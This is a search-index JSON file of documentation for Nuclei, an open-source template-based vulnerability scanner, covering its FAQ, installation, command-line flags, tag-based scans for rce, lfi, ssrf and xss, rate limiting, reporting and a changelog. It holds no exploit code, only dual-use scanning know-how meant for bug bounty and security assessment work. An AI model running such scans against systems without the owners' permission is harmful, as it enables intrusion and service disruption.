{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"","title":"Index"},{"location":"faq/nuclei/","text":"What is nuclei? Nuclei is a fast and customizable vulnerability scanner based on simple YAML-based templates . It has two components, 1) Nuclei engine - the core of the project allows scripting HTTP / DNS / Network / Headless / File protocols based checks in a very simple to read-and-write YAML-based format. 2) Nuclei templates - ready-to-use community-contributed vulnerability templates. What was the genesis behind nuclei? Traditional scanners always lacked the features to allow easy-to-write custom checks on top of their engine. And this is how we started developing Nuclei with a core focus on simplicity, modularity, and the ability to scan on many assets. We wanted something simple enough to be used by everyone while complex enough to integrate into the modern web with its intricacies. The features implemented in nuclei are tailored to allow very rapid prototyping of complex security checks. What modules does nuclei engine support? Nuclei engine supports the following type of modules. HTTP DNS TCP FILE What kind of scans can I perform with nuclei? Nuclei can be used to detect security vulnerabilities in Web Applications , Networks , DNS based misconfiguration, and Secret scanning in source code or files on the local file system. How well-maintained is this project? Nuclei project is developed and maintained by ProjectDiscovery team and is in active development (we tend to push release every other week). How can I support/contribute to this project? \ud83d\udc99 To keep us motivated to work on this project, we request you to write/share new nuclei templates with the community at template project and help us to maintain this public and ready to use / up-to-date nuclei templates. If you found an interesting/unique security issue using nuclei and wanted to share the process walk-through with everyone in the form of a blog, we are happy to publish your guest blog at https://blog.projectdiscovery.io . I found results with nuclei. When should I report it? Wait for a moment , after nuclei detected security issue, it's always advised to have a second look before reporting it. Here is a tip to confirm/validate the found matches. How to validate nuclei results! Once nuclei finds a result, you have vulnerable URL and template , rerun the template with -debug flag to inspect vulnerable response against expected matcher defined in the template. In this way, you can confirm the identified vulnerability. How much traffic does nuclei generate? As default nuclei makes 1234 HTTP requests in total against single target upon running all nuclei-templates directory. This includes 801 nuclei templates from v8.1.9 release. As default, few templates listed here are excluded from default scans. Is it safe to run nuclei? We consider two factors to say \"safe\" in context of nuclei - The traffic nuclei makes against the target website. The impact templates have on the target website. HTTP Traffic Out of the box, nuclei makes around 1200 - 1300 HTTP requests in total for a given target when all available public templates are executed, which is considered relatively low in numbers and will grow as the template number grows. Safe Templates Nuclei templates project houses a variety of templates which includes fuzzing and templates resulting DOS on the target system. To ensure that no one accidentally runs these templates, we tagged and excluded these templates from the default nuclei scan. These templates can be only executed when the user explicitly instructs nuclei to run them. What is the license of nuclei? Nuclei is an open-source project distributed under MIT License . I have more questions \ud83d\ude4b You are welcome to join our Discord server , and we are active on Twitter as well.","title":"Nuclei FAQ"},{"location":"faq/templates/","text":"What are nuclei templates? Nuclei templates are the core of the nuclei project. The template contains the actual logic to execute for detecting various vulnerabilities and checks, template projects consist 880 + ready-to-use community-contributed vulnerability templates. How to write nuclei templates? We maintain a documentation guide for writing new and custom nuclei templates. We also have sample templates for various module nuclei support. Is writing nuclei templates useful? Performing security assessment of the application is time-consuming. Its always better and a time-saver to automate the steps, whenever possible. Once you've found a security vulnerability, you can prepare a nuclei template by defining the required HTTP request to reproduce the issue and test the same vulnerability across multiple hosts with ease. Worth mentioning you write the template once and use it forever , as you don't need to manually test that specific vulnerability anymore. Here are few examples from the community making use of templates to automate the security findings. Reference https://dhiyaneshgeek.github.io/web/security/2021/02/19/exploiting-out-of-band-xxe/ https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning https://blog.melbadry9.xyz/dangling-dns/xyz-services/ddns-worksites https://blog.melbadry9.xyz/dangling-dns/aws/ddns-ec2-current-state https://blog.projectdiscovery.io/writing-nuclei-templates-for-wordpress-cves/ How to run nuclei templates? Nuclei templates can be executed using template name or tags, using -t , -tags flag, respectively. nuclei -tags cve -list target_urls.txt I want to contribute nuclei templates \ud83d\ude01 You are always welcome to share your nuclei template with the community. You can either open GitHub issue with template details or open a Github pull request with your nuclei templates. If you don't have a GitHub account, you can also make use of discord server to share the template with us and we will make sure to add them to the project asap. I'm getting false-positive results! Nuclei templates is a community-contributed project . We try our best to manually review them before merging them into the template project. Still, there is a possibility that some templates with weak matchers will slip through the manual verification. This will produce false-positive results. Templates are only as good as their matchers. If you identified templates producing false positive/negative results, here are few steps that you can follow to fix the templates quickly. I found a template producing false +ve/-ve result but I'm not sure if this is accurate. DM us on twitter or discord server to confirm the validity of the template. I found a template producing false +ve/-ve result and I don't know how to fix it. Please open a GitHub issue with details, and we will quickly address the problem and update the template. I found a template producing a false +ve/-ve result and I know how to fix it. Please open a GitHub pull request with fix. I'm not able to run all templates! Nuclei follows the default list of templates that are excluded from default run and are listed here , This is to ensure that no one runs any templates that are not meant to run along with all templates. We also want to make sure that no one is excluded from running safe scans. We do not suggest that you run them unless you are running them for a specific use. Templates exist on GitHub but not running with nuclei? When you download or update nuclei templates using nuclei binary, it downloads all the templates from the latest release. All templates added after the release exist in the master branch and are added to nuclei when a new template release is created.","title":"Templates FAQ"},{"location":"nuclei/get-started/","text":"Nuclei Features \u00b6 Features. HTTP | DNS | TCP | FILE support Fully configurable templates. Large scale scanning. Out of band based detections. Easily write your own templates. Nuclei Installation \u00b6 Go GO111MODULE=on go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei Info Nuclei require latest GO version to install successfully. Brew brew install nuclei Info Supported in macOS (or Linux) Docker docker pull projectdiscovery/nuclei:latest Github git clone https://github.com/projectdiscovery/nuclei.git; \\ cd nuclei/v2/cmd/nuclei; \\ go build; \\ mv nuclei /usr/local/bin/; \\ nuclei -version; Info Nuclei require the latest GO version to install successfully. Binary https://github.com/projectdiscovery/nuclei/releases Tip Download the latest binary for your OS. Unzip the binary with tar -xzvf nuclei-*.tar.gz Template Download \u00b6 Nuclei templates can be downloaded and update using the update-templates flag of nuclei, which downloads the latest release from Nuclei templates GitHub project, a community-curated list of templates that are ready to use. nuclei -update-templates Info update-templates flag download/pulls the latest release from https://github.com/projectdiscovery/nuclei-templates/releases , that does not include recently added templates in the master branch. Tip Writing your own unique templates will always keep you one step ahead of others. Nuclei Usage \u00b6 nuclei -h This will display help for the tool. Here are all the switches it supports. nuclei -h Flag Description ------------------------------------- ------------------------------------------------------------ -H, -header value Custom Header. -biid, -burp-collaborator-biid string Burp Collaborator BIID -bs, -bulk-size int Maximum Number of hosts analyzed in parallel per template (default 25) -c, -concurrency int Maximum Number of templates executed in parallel (default 10) -config string Nuclei configuration file -de, -disk-export string Directory on disk to export reports in markdown to -debug Debugging request and responses -debug-req Debugging request -debug-resp Debugging response -et, -exclude value Templates to exclude, supports single and multiple templates using directory. -etags, -exclude-tags value Exclude templates with the provided tags -headless Enable headless browser based templates support -impact, -severity value Templates to run based on severity, supports single and multiple severity. -irr, -include-rr Write requests/responses for matches in JSON output -interactions-cache-size int Number of requests to keep in interactions cache (default 5000) -interactions-cooldown-period int Extra time for interaction polling before exiting (default 5) -interactions-eviction int Number of seconds to wait before evicting requests from cache (default 60) -interactions-poll-duration int Number of seconds before each interaction poll request (default 5) -interactsh-url string Interactsh Server URL (default https://interact.sh) -json Write json output to files -l, -list string List of URLs to run templates on -metrics Expose nuclei metrics on a port -metrics-port int Port to expose nuclei metrics on (default 9092) -nc, -no-color Disable colors in output -nt, -new-templates Only run newly added templates -nm, -no-meta Don't display metadata for the matches -no-interactsh Do not use interactsh server for blind interaction polling -o, -output string File to write output to (optional) -page-timeout int Seconds to wait for each page in headless (default 20) -passive Enable Passive HTTP response processing mode -project Use a project folder to avoid sending same request multiple times -project-path string Use a user defined project folder, temporary folder is used if not specified but enabled -proxy-socks-url string URL of the proxy socks server -proxy-url string URL of the proxy server -r, -resolvers string File containing resolver list for nuclei -rl, -rate-limit int Maximum requests to send per second (default 150) -rc, -report-config string Nuclei Reporting Module configuration file -rdb, -report-db string Local Nuclei Reporting Database (Always use this to persistent report data) -retries int Number of times to retry a failed request (default 1) -show-browser Show the browser on the screen -si, -stats-interval int Number of seconds between each stats line (default 5) -silent Show only results in output -spm, -stop-at-first-path Stop processing http requests at first match (this may break template/workflow logic) -stats Display stats of the running scan -system-resolvers Use system dns resolving as error fallback -t, -templates value Templates to run, supports single and multiple templates using directory. -tags value Tags to execute templates for -u, -target string URL to scan with nuclei -tv, -templates-version Shows the installed nuclei-templates version -timeout int Time to wait in seconds before timeout (default 5) -tl List available templates -trace-log string File to write sent requests trace log -ud, -update-directory string Directory storing nuclei-templates (default /root/nuclei-templates) -ut, -update-templates Download / updates nuclei community templates -v, -verbose Show verbose output -version Show version of nuclei -w, -workflows value Workflows to run for nuclei Running Nuclei \u00b6 Nuclei templates can be executed in multiple ways, currently using tags, templates, severity and workflows . Running nuclei with templates Templates flag is used to provide template file or/and directory, single or multiple templates or directory can be used using multiple t flag inputs. Running nuclei with single template nuclei -t exposures/configs/git-config.yaml -l urls.txt Running nuclei with template directory nuclei -t cves/2021/ -l urls.txt Running nuclei with multiple template directory nuclei -t cves/2020/ -t exposed-tokens -t misconfiguration -l urls.txt Running nuclei using tags Tags can be used for template execution with or without the need of template directory/flag, if templates/t flag is used with tags , the tags will be applied on the particular template directory, otherwise, it will run all the templates with matched tag from default template download location ( $HOME/nuclei-templates/ ). Running nuclei with single tags nuclei -tags cve -l urls.txt nuclei -tags network -l urls.txt nuclei -tags logs -l urls.txt Running nuclei with tags along with directory nuclei -tags config -t exposures/ -l urls.txt Running nuclei with multiple tags nuclei -tags lfi,ssrf,rce -t cves/ -l urls.txt ```` nuclei -tags xss -t vulnerabilities/ -l urls.txt ```` Running nuclei with workflows Workflows are the best possible way to manage and run multiple templates using a single workflow file for custom and dedicated workflow depending on the project and test case. Running nuclei with workflow nuclei -w workflows/wordpress-workflow.yaml -l wordpress_urls.txt Running nuclei with multiple workflow nuclei -w workflows/wordpress-workflow.yaml -w workflows/jira-workflow.yaml -l urls.txt Running nuclei with severity Severity flag is used to run templates with specific or multiple severities altogether. Running nuclei with single severity nuclei -t cves/ -severity critical -l urls.txt Running nuclei with multiple severity nuclei -t cves/ -t vulnerabilities -severity critical,high -l urls.txt Running nuclei with docker Running nuclei in docker container echo hackerone.com | docker run -v $HOME/nuclei-templates:/root/nuclei-templates -i projectdiscovery/nuclei:v2.3.0 -t dns > output.txt Warning Nuclei accept URLs as input format in order to execute HTTP templates. Tip httpx can be used to generate URLs from subdomains as a input for nuclei. Rate Limits \u00b6 Nuclei have multiple rate limit controls for multiple factors, including a number of templates to execute in parallel, a number of hosts to be scanned in parallel for each template, and the global number of request / per second you wanted to make/limit using nuclei, here is an example of each flag with description. Flag Description rate-limit Control the total number of request to send per seconds bulk-size Control the number of hosts to process in parallel for each template c Control the number of templates to process in parallel Feel free to play with these flags to tune your nuclei scan speed and accuracy. Tip rate-limit flag takes precedence over the other two flags, the number of requests/seconds can't go beyond the value defined for rate-limit flag regardless the value of c and bulk-size flag. Traffic Tagging \u00b6 Many BugBounty platform/programs/ requires you to identify the HTTP traffic you make, this can be achieved by setting custom header using config file at $HOME/.config/nuclei/config.yaml or CLI flag -H / header Setting custom header using config file # Headers to include with each request. header : - 'X-BugBounty-Hacker: h1/geekboy' - 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) / nuclei' Setting custom header using CLI flag nuclei -header 'User-Agent : Mozilla/5.0 (Windows NT 10.0; WOW64) / nuclei' -list urls.txt -tags cves Template Exclusion \u00b6 Nuclei supports multiple ways to exclude templates for the execution, as default nuclei excludes two type of templates . Template from ignore list Templates with dos tags Why nuclei-ignore? To ensure templates that are not meant to be used for generic scan, including fuzzing, bruteforce, headless, templates that have severe impact, e.g., DOS. Nuclei also support template exclusion at run time using -exclude and -exclude-tags flag. exclude flag is used to exclude single/multiple templates and directory, multiple -exclude flag can be used to provide multiple values. Running nuclei with single template exclusion nuclei -l urls.txt -t cves/ -exclude cves/2020/CVE-2020-XXXX.yaml Running nuclei with multiple template exclusion nuclei -l urls.txt -t nuclei-templates/ -exclude exposed-panels/ -exclude technologies exclude-tags flag is used to exclude templates with given tags, multiple tags can be excluded using comma separate values. Running nuclei with single tags exclusion nuclei -l urls.txt -t cves/ -etags xss Running nuclei with multiple tags exclusion nuclei -l urls.txt -t cves/ -etags sqli,rce Nuclei Config \u00b6 goflags Since release of v.2.3.2 nuclei uses goflags for clean CLI experience and long/short formatted flags. goflags comes with auto-generated config file support that coverts all available CLI flags into config file, basically you can define all CLI flags into config file to avoid repetitive CLI flags that loads as default for every scan of nuclei. Default path of nuclei config file is $HOME/.config/nuclei/config.yaml , uncomment and configure the flags you wish to run as default. Here is an example config file:- # Headers to include with each request. header : - 'X-BugBounty-Hacker: h1/geekboy' - 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64)' # Templates with tags to run tags : rce,lfi # Templates with tags to exclude exclude-tags : info # Templates to scan templates : - cves/ - vulnerabilities/ - misconfiguration/ # Templates to exclude scan exclude : - vulnerabilities/xxx - misconfiguration/xxxx # Rate limit configuration for scan rate-limit : 500 bulk-size : 50 concurrency : 50 Once configured, config file be used as default , additionally custom config file can be also provided using -config flag. Running nuclei with custom config file nuclei -config project.yaml -list urls.txt Nuclei Reporting \u00b6 Nuclei comes with reporting module support with the release of v2.3.0 supporting GitHub, GitLab, and Jira integration, this allows nuclei engine to create automatic tickets on the supported platform based on found results. Platform GitHub GitLab Jira Markdown Support -rc, -report-config flag can be used to provide a config file to read configuration details of the platform to integrate. Here is an example config file for all supported platforms. For example, to create tickets on GitHub, create a config file with the following content and replace the appropriate values:- # Github contains configuration options for GitHub issue tracker github : username : \"$user\" owner : \"$user\" token : \"$token\" project-name : \"testing-project\" issue-label : \"Nuclei\" Running nuclei with reporting module:- nuclei -l urls.txt -t cves/ -rc issue-tracker.yaml Similarly, other platforms can be configured. Reporting module also supports basic filtering and duplicate checks to avoid duplicate ticket creation. allow-list : severity : high,critical This will ensure to only creating tickets for issues identified with high and critical severity; similarly, deny-list can be used to exclude issues with a specific severity. If you are running periodic scans on the same assets, you might want to consider -rdb, -report-db flag that creates a local copy of the valid findings in the given directory utilized by reporting module to compare and create tickets for unique issues only . nuclei -l urls.txt -t cves/ -rc issue-tracker.yaml -rdb prod Markdown Export Nuclei supports markdown export of valid findings with -de, -disk-export flag, this flag takes directory as input to store markdown formatted reports. Including request/response in the markdown report is optional, and included when -irr, -include-rr flag is used along with -de . nuclei -l urls.txt -t cves/ -irr -disk-export reports Scan Metrics \u00b6 Nuclei expose running scan metrics on a local port 9092 when -metrics flag is used and can be accessed at localhost:9092/metrics , default port to exposes scan information is configurable using -metrics-port flag. Here is an example to query metrics while running nuclei as following nuclei -t cves/ -l urls.txt -metrics curl -s localhost:9092/metrics | jq . { \"duration\" : \"0:00:03\" , \"errors\" : \"2\" , \"hosts\" : \"1\" , \"matched\" : \"0\" , \"percent\" : \"99\" , \"requests\" : \"350\" , \"rps\" : \"132\" , \"startedAt\" : \"2021-03-27T18:02:18.886745+05:30\" , \"templates\" : \"256\" , \"total\" : \"352\" } Code Contribution \u00b6 Nuclei templates are the base of the nuclei project. We appreciate it if you can write and submit new templates to keep this project alive, and one of the reasons to keep us motivated to keep working on this project. License \u00b6 Nuclei is distributed under MIT License .","title":"Index"},{"location":"nuclei/get-started/#nuclei-features","text":"Features. HTTP | DNS | TCP | FILE support Fully configurable templates. Large scale scanning. Out of band based detections. Easily write your own templates.","title":"Nuclei Features"},{"location":"nuclei/get-started/#nuclei-installation","text":"Go GO111MODULE=on go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei Info Nuclei require latest GO version to install successfully. Brew brew install nuclei Info Supported in macOS (or Linux) Docker docker pull projectdiscovery/nuclei:latest Github git clone https://github.com/projectdiscovery/nuclei.git; \\ cd nuclei/v2/cmd/nuclei; \\ go build; \\ mv nuclei /usr/local/bin/; \\ nuclei -version; Info Nuclei require the latest GO version to install successfully. Binary https://github.com/projectdiscovery/nuclei/releases Tip Download the latest binary for your OS. Unzip the binary with tar -xzvf nuclei-*.tar.gz","title":"Nuclei Installation"},{"location":"nuclei/get-started/#template-download","text":"Nuclei templates can be downloaded and update using the update-templates flag of nuclei, which downloads the latest release from Nuclei templates GitHub project, a community-curated list of templates that are ready to use. nuclei -update-templates Info update-templates flag download/pulls the latest release from https://github.com/projectdiscovery/nuclei-templates/releases , that does not include recently added templates in the master branch. Tip Writing your own unique templates will always keep you one step ahead of others.","title":"Template Download"},{"location":"nuclei/get-started/#nuclei-usage","text":"nuclei -h This will display help for the tool. Here are all the switches it supports. nuclei -h Flag Description ------------------------------------- ------------------------------------------------------------ -H, -header value Custom Header. -biid, -burp-collaborator-biid string Burp Collaborator BIID -bs, -bulk-size int Maximum Number of hosts analyzed in parallel per template (default 25) -c, -concurrency int Maximum Number of templates executed in parallel (default 10) -config string Nuclei configuration file -de, -disk-export string Directory on disk to export reports in markdown to -debug Debugging request and responses -debug-req Debugging request -debug-resp Debugging response -et, -exclude value Templates to exclude, supports single and multiple templates using directory. -etags, -exclude-tags value Exclude templates with the provided tags -headless Enable headless browser based templates support -impact, -severity value Templates to run based on severity, supports single and multiple severity. -irr, -include-rr Write requests/responses for matches in JSON output -interactions-cache-size int Number of requests to keep in interactions cache (default 5000) -interactions-cooldown-period int Extra time for interaction polling before exiting (default 5) -interactions-eviction int Number of seconds to wait before evicting requests from cache (default 60) -interactions-poll-duration int Number of seconds before each interaction poll request (default 5) -interactsh-url string Interactsh Server URL (default https://interact.sh) -json Write json output to files -l, -list string List of URLs to run templates on -metrics Expose nuclei metrics on a port -metrics-port int Port to expose nuclei metrics on (default 9092) -nc, -no-color Disable colors in output -nt, -new-templates Only run newly added templates -nm, -no-meta Don't display metadata for the matches -no-interactsh Do not use interactsh server for blind interaction polling -o, -output string File to write output to (optional) -page-timeout int Seconds to wait for each page in headless (default 20) -passive Enable Passive HTTP response processing mode -project Use a project folder to avoid sending same request multiple times -project-path string Use a user defined project folder, temporary folder is used if not specified but enabled -proxy-socks-url string URL of the proxy socks server -proxy-url string URL of the proxy server -r, -resolvers string File containing resolver list for nuclei -rl, -rate-limit int Maximum requests to send per second (default 150) -rc, -report-config string Nuclei Reporting Module configuration file -rdb, -report-db string Local Nuclei Reporting Database (Always use this to persistent report data) -retries int Number of times to retry a failed request (default 1) -show-browser Show the browser on the screen -si, -stats-interval int Number of seconds between each stats line (default 5) -silent Show only results in output -spm, -stop-at-first-path Stop processing http requests at first match (this may break template/workflow logic) -stats Display stats of the running scan -system-resolvers Use system dns resolving as error fallback -t, -templates value Templates to run, supports single and multiple templates using directory. -tags value Tags to execute templates for -u, -target string URL to scan with nuclei -tv, -templates-version Shows the installed nuclei-templates version -timeout int Time to wait in seconds before timeout (default 5) -tl List available templates -trace-log string File to write sent requests trace log -ud, -update-directory string Directory storing nuclei-templates (default /root/nuclei-templates) -ut, -update-templates Download / updates nuclei community templates -v, -verbose Show verbose output -version Show version of nuclei -w, -workflows value Workflows to run for nuclei","title":"Nuclei Usage"},{"location":"nuclei/get-started/#running-nuclei","text":"Nuclei templates can be executed in multiple ways, currently using tags, templates, severity and workflows . Running nuclei with templates Templates flag is used to provide template file or/and directory, single or multiple templates or directory can be used using multiple t flag inputs. Running nuclei with single template nuclei -t exposures/configs/git-config.yaml -l urls.txt Running nuclei with template directory nuclei -t cves/2021/ -l urls.txt Running nuclei with multiple template directory nuclei -t cves/2020/ -t exposed-tokens -t misconfiguration -l urls.txt Running nuclei using tags Tags can be used for template execution with or without the need of template directory/flag, if templates/t flag is used with tags , the tags will be applied on the particular template directory, otherwise, it will run all the templates with matched tag from default template download location ( $HOME/nuclei-templates/ ). Running nuclei with single tags nuclei -tags cve -l urls.txt nuclei -tags network -l urls.txt nuclei -tags logs -l urls.txt Running nuclei with tags along with directory nuclei -tags config -t exposures/ -l urls.txt Running nuclei with multiple tags nuclei -tags lfi,ssrf,rce -t cves/ -l urls.txt ```` nuclei -tags xss -t vulnerabilities/ -l urls.txt ```` Running nuclei with workflows Workflows are the best possible way to manage and run multiple templates using a single workflow file for custom and dedicated workflow depending on the project and test case. Running nuclei with workflow nuclei -w workflows/wordpress-workflow.yaml -l wordpress_urls.txt Running nuclei with multiple workflow nuclei -w workflows/wordpress-workflow.yaml -w workflows/jira-workflow.yaml -l urls.txt Running nuclei with severity Severity flag is used to run templates with specific or multiple severities altogether. Running nuclei with single severity nuclei -t cves/ -severity critical -l urls.txt Running nuclei with multiple severity nuclei -t cves/ -t vulnerabilities -severity critical,high -l urls.txt Running nuclei with docker Running nuclei in docker container echo hackerone.com | docker run -v $HOME/nuclei-templates:/root/nuclei-templates -i projectdiscovery/nuclei:v2.3.0 -t dns > output.txt Warning Nuclei accept URLs as input format in order to execute HTTP templates. Tip httpx can be used to generate URLs from subdomains as a input for nuclei.","title":"Running Nuclei"},{"location":"nuclei/get-started/#rate-limits","text":"Nuclei have multiple rate limit controls for multiple factors, including a number of templates to execute in parallel, a number of hosts to be scanned in parallel for each template, and the global number of request / per second you wanted to make/limit using nuclei, here is an example of each flag with description. Flag Description rate-limit Control the total number of request to send per seconds bulk-size Control the number of hosts to process in parallel for each template c Control the number of templates to process in parallel Feel free to play with these flags to tune your nuclei scan speed and accuracy. Tip rate-limit flag takes precedence over the other two flags, the number of requests/seconds can't go beyond the value defined for rate-limit flag regardless the value of c and bulk-size flag.","title":"Rate Limits"},{"location":"nuclei/get-started/#traffic-tagging","text":"Many BugBounty platform/programs/ requires you to identify the HTTP traffic you make, this can be achieved by setting custom header using config file at $HOME/.config/nuclei/config.yaml or CLI flag -H / header Setting custom header using config file # Headers to include with each request. header : - 'X-BugBounty-Hacker: h1/geekboy' - 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) / nuclei' Setting custom header using CLI flag nuclei -header 'User-Agent : Mozilla/5.0 (Windows NT 10.0; WOW64) / nuclei' -list urls.txt -tags cves","title":"Traffic Tagging"},{"location":"nuclei/get-started/#template-exclusion","text":"Nuclei supports multiple ways to exclude templates for the execution, as default nuclei excludes two type of templates . Template from ignore list Templates with dos tags Why nuclei-ignore? To ensure templates that are not meant to be used for generic scan, including fuzzing, bruteforce, headless, templates that have severe impact, e.g., DOS. Nuclei also support template exclusion at run time using -exclude and -exclude-tags flag. exclude flag is used to exclude single/multiple templates and directory, multiple -exclude flag can be used to provide multiple values. Running nuclei with single template exclusion nuclei -l urls.txt -t cves/ -exclude cves/2020/CVE-2020-XXXX.yaml Running nuclei with multiple template exclusion nuclei -l urls.txt -t nuclei-templates/ -exclude exposed-panels/ -exclude technologies exclude-tags flag is used to exclude templates with given tags, multiple tags can be excluded using comma separate values. Running nuclei with single tags exclusion nuclei -l urls.txt -t cves/ -etags xss Running nuclei with multiple tags exclusion nuclei -l urls.txt -t cves/ -etags sqli,rce","title":"Template Exclusion"},{"location":"nuclei/get-started/#nuclei-config","text":"goflags Since release of v.2.3.2 nuclei uses goflags for clean CLI experience and long/short formatted flags. goflags comes with auto-generated config file support that coverts all available CLI flags into config file, basically you can define all CLI flags into config file to avoid repetitive CLI flags that loads as default for every scan of nuclei. Default path of nuclei config file is $HOME/.config/nuclei/config.yaml , uncomment and configure the flags you wish to run as default. Here is an example config file:- # Headers to include with each request. header : - 'X-BugBounty-Hacker: h1/geekboy' - 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64)' # Templates with tags to run tags : rce,lfi # Templates with tags to exclude exclude-tags : info # Templates to scan templates : - cves/ - vulnerabilities/ - misconfiguration/ # Templates to exclude scan exclude : - vulnerabilities/xxx - misconfiguration/xxxx # Rate limit configuration for scan rate-limit : 500 bulk-size : 50 concurrency : 50 Once configured, config file be used as default , additionally custom config file can be also provided using -config flag. Running nuclei with custom config file nuclei -config project.yaml -list urls.txt","title":"Nuclei Config"},{"location":"nuclei/get-started/#nuclei-reporting","text":"Nuclei comes with reporting module support with the release of v2.3.0 supporting GitHub, GitLab, and Jira integration, this allows nuclei engine to create automatic tickets on the supported platform based on found results. Platform GitHub GitLab Jira Markdown Support -rc, -report-config flag can be used to provide a config file to read configuration details of the platform to integrate. Here is an example config file for all supported platforms. For example, to create tickets on GitHub, create a config file with the following content and replace the appropriate values:- # Github contains configuration options for GitHub issue tracker github : username : \"$user\" owner : \"$user\" token : \"$token\" project-name : \"testing-project\" issue-label : \"Nuclei\" Running nuclei with reporting module:- nuclei -l urls.txt -t cves/ -rc issue-tracker.yaml Similarly, other platforms can be configured. Reporting module also supports basic filtering and duplicate checks to avoid duplicate ticket creation. allow-list : severity : high,critical This will ensure to only creating tickets for issues identified with high and critical severity; similarly, deny-list can be used to exclude issues with a specific severity. If you are running periodic scans on the same assets, you might want to consider -rdb, -report-db flag that creates a local copy of the valid findings in the given directory utilized by reporting module to compare and create tickets for unique issues only . nuclei -l urls.txt -t cves/ -rc issue-tracker.yaml -rdb prod Markdown Export Nuclei supports markdown export of valid findings with -de, -disk-export flag, this flag takes directory as input to store markdown formatted reports. Including request/response in the markdown report is optional, and included when -irr, -include-rr flag is used along with -de . nuclei -l urls.txt -t cves/ -irr -disk-export reports","title":"Nuclei Reporting"},{"location":"nuclei/get-started/#scan-metrics","text":"Nuclei expose running scan metrics on a local port 9092 when -metrics flag is used and can be accessed at localhost:9092/metrics , default port to exposes scan information is configurable using -metrics-port flag. Here is an example to query metrics while running nuclei as following nuclei -t cves/ -l urls.txt -metrics curl -s localhost:9092/metrics | jq . { \"duration\" : \"0:00:03\" , \"errors\" : \"2\" , \"hosts\" : \"1\" , \"matched\" : \"0\" , \"percent\" : \"99\" , \"requests\" : \"350\" , \"rps\" : \"132\" , \"startedAt\" : \"2021-03-27T18:02:18.886745+05:30\" , \"templates\" : \"256\" , \"total\" : \"352\" }","title":"Scan Metrics"},{"location":"nuclei/get-started/#code-contribution","text":"Nuclei templates are the base of the nuclei project. We appreciate it if you can write and submit new templates to keep this project alive, and one of the reasons to keep us motivated to keep working on this project.","title":"Code Contribution"},{"location":"nuclei/get-started/#license","text":"Nuclei is distributed under MIT License .","title":"License"},{"location":"releases/nuclei-changelog/","text":"Changelog \u00b6 Nuclei v2.3.7 - 10 May 2021 \u00b6 Improvements to interactsh integration Fixed fatal error with interactsh client Nuclei v2.3.6 - 4 May 2021 \u00b6 Interactsh integration into Nuclei Improved support for custom host header w/ template and CLI flag Nuclei v2.3.5 - 28 April 2021 \u00b6 Fix for not setting custom user agent in templates by @yabeow Fix for missing IP in the JSON when URLs contain hostname:port by @seb-elttam Fix for temporary file cleanups Nuclei v2.3.4 - 2 April 2021 \u00b6 Added improved template exclusion support using tags. Fixed errors listing with excluded templates. Nuclei v2.3.3 - 1 April 2021 \u00b6 Fixed a bug with .nuclei-ignore file update Fixed a bug and removed random-agent flag (now used as default) Nuclei v2.3.2 - 22 March 2021 \u00b6 Added markdown export to disk in the reporting module ( -de reports ) Fixed body length error with report integration module. Fixed matched counter bug in metrics endpoint. Fixed config file parser bug. Fixed bug with nuclei-ignore file. Fixed a bug with stats counter. Fixed a bug with running newly added templates ( -nt flag) Fixed a but making all workflows to run on running single workflow Fixed panic crash with DNS module. Fixed a bug to exclude timestamp when no-meta flag is used. Fixed crash when running with a non-root user. Nuclei v2.3.1 - 14 March 2021 \u00b6 Fixed a bug with severity flag parsing Fixed panic crash with http status codes Fixed retries in DNS requests failing Added exclude-tags/etags support, dos tag will be excluded as default. Added support to severity using tags, (-tags low,high) Added issue-tracker-config file Nuclei v2.3.0 - 10 March 2021 \u00b6 Added Headless chrome based templates support Added Network based (TCP) support. Added File based template support. Added HTTP Request clusterning for similar paths. Added Tag based template execution. Added Config file support. Added passive support for HTTP based templates. Added w/workflows to only run workflow based templates Added Request condition support. Added Support for system resolvers. Added Rxpressions package + expressions support to network protocols Added Hex encoding support in matchers Added Dns fallback support Added Missing rawhttp option override Added TLS protocol test Added Parallelism to workflows Added Simple json based http metrics support Added Helper functions to payloads Added r flag to allow users usage of custom resolvers Added Support for http response redirect chain print and match Added max http body resp size option Added Jira,Github,Gitlab issue tracker integration to nuclei Added goflags library support. Added reworked generators package Moved colorizer stuff to pkg/output Moved tracefile to pkg/output + misC Fixed output endpoint in unsafe request without host header Fixed multiple bugs with rawhttp Fixed rawhttp header formatting issues Fixed raw http newline formatting Fixed a bug with workflows Fixed a bug with request count. Fixed underscore in header names for kval matcher Fixed path & port parsing for raw requests Nuclei v2.2.0 - 20 Nov 2020 \u00b6 Added Turbo intruder support for fuzzing Added HTTP pipeline support for fuzzing Added Connection pooling support for fuzzing Added Raw HTTP support for malformed HTTP requests. Added support for Race condition testing Added \u00a7variable\u00a7 marker for fuzzing Added stats in multithreaded requests (fuzzing) Added YAML syntax support for workflows Added Project file support for request reuse Added global rate limit support Added burp collaborator support Added hmap for reducing memory uses Added clistats in place of a progress bar Added support to DSL matcher to match each unique request Added trace log ( -trace-log ) support Added -templates-version flag to list template version Added -no-meta flag to ignore meta information Added dynamic field support in the template info block Added bulk-size flag Added response time support to DSL Added type to specify type of request Added mmh3 hashing support in helper functions Added shared resolver cache among various HTTP clients Added fuzzing payloads output values to json output Added .nuclei-ignore file from current working directory Added comments support in .nuclei-ignore file Added stop-at-first-match flag Added flag to disable host header and content length Added host information in the JSON response by @savushkin-yauheni Updated flag nC to no-color Updated flag json-requests to include-rr Updated flag pbar to stats Fixed a bug with ignoring paths in the input file by @vzamanillo Fixed a bug with raw requests redirect Fixed a bug with debug flag to display post body Fixed a panic with trace log Nuclei v2.1.1 \u00b6 Added negative matcher support Added support for severity based filtering with severity flag by @manuelbua Added support for template exclusions with exclude flag by @manuelbua Added .nuclei-ignore file support Added rate limit per host with rl flag by @CasperGN Added template list support with tl flag by @vzamanillo Added template name field in JSON output by @vzamanillo Added color support for severity by @vzamanillo Added Progress bar support with the silent flag by @vzamanillo Added support for using local templates along with nuclei-templates Added template preloading at the start of the scan Added support for golangci lint by @vzamanillo Added JSON output support for DNS templates by @Marmelatze Added centralize template loaded info message, add output coloring by @manuelbua Added template ID on HTTP request error message 